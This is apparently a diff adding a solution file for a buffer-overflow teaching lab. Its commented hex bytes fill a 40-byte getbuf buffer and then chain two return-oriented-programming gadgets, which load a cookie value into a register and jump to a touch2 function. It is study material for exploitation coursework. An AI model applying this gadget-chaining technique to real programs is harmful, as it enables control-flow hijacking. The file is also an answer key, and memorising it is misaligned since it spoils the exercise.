@@ -1,0 +1,25 @@
+/* getbuf function preserves a 40 bytes buffer */
+/* use 40 bytes of ascii number to fill all the buffer */
+    30 31 32 33 34 35 36 37 38 39
+    30 31 32 33 34 35 36 37 38 39
+    30 31 32 33 34 35 36 37 38 39
+    30 31 32 33 34 35 36 37 38 39
+
+/* we found there are two useful gadgets in the binary */
+/* 0000000000808bee: movq %rax, %rdi; nop; retq */
+/* 0000000000808bfd: popq %rax; nop; retq */
+/* with these two gadgets, we can write arbitrary value to arbitrary address */
+
+/* first, redirect the return address to the pop instruction */
+    fd 8b 80 00 00 00 00 00
+
+/* then we need to write our cookie into the stack */
+/* so that the popq instruction will put the cookie into rax */
+    77 1c c1 3c 00 00 00 00
+
+/* then a retq instruction will help us to jump to the movq instruction */
+    ee 8b 80 00 00 00 00 00
+
+/* then we should call the touch2 function */
+/* the address of touch2 function is 0x808a2c */
+    2c 8a 80 00 00 00 00 00
